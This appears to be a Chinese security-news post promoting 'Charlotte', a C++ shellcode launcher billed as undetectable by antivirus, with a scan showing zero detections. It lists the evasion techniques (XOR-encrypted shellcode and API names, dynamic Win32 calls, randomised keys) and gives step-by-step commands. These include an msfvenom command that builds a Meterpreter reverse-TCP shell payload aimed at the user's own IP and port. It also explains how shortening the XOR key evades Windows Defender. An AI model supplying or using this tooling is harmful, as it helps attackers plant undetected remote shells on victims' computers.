![](https://image.3001.net/images/20210525/1621899686_60ac39a60194cfcd849d0.jpg!small)

## 关于Charlotte

Charlotte是一款基于C++实现的Shellcode启动器，并且完全不会被安全解决方案所检测到。

## 工具特性

截止至2021年5月13日之前，该工具的检测结果为0/26；

该工具支持动态调用Win32 API函数；

对Shellcode和函数名进行异或加密；

每次运行随机化异或密钥和变量；

在Kali Linux上，只需运行“apt-get install mingw-w64*”即可；

支持随机字符串长度和异或密钥长度；

## antiscan.me

![](https://image.3001.net/images/20210525/1621899703_60ac39b7dbe59b40a02d8.png!small)

## 工具使用

首先，我们需要使用git clone命令将该项目源码克隆至本地，并使用脚本工具生成Shellcode文件。具体操作示例如下：

    
    
    git clone https://github.com/9emin1/charlotte.git && apt-get install mingw-w64*
    
    cd charlotte
    
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw > beacon.bin
    
    python charlotte.py

## 使用msfvenom -p测试以及Cobalt Strike原始格式Payload

![](https://image.3001.net/images/20210525/1621899720_60ac39c82886c27031203.gif)

## 强化功能

很明显，Windows Defender是能够检测到.DLL代码的，但我们在POC中通过将16字节大小的异或密钥降低至9个字节，就可以规避检测了。

## 项目地址

Charlotte：【[ _GitHub传送门_](https://github.com/9emin1/charlotte)】

